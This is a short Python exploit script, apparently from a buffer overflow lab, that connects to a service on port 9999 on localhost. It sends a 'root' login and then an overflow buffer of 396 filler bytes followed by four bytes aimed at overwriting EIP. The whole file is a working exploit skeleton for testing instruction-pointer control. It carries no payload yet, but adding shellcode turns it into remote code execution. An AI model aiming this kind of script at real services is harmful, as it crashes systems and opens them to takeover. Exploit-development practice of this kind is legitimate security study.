import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999

offset = 396
eip = b"B" * 4
tmp = b"C" * 16

buffer = (b"A" * offset + eip + tmp)

print("Fuzzin ... ")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))
s.recv(1024)
    
s.send(b'root\r\n')
s.recv(1024)
s.send(buffer + b'\r\n')
s.send(b'QUIT\r\n')
s.close()

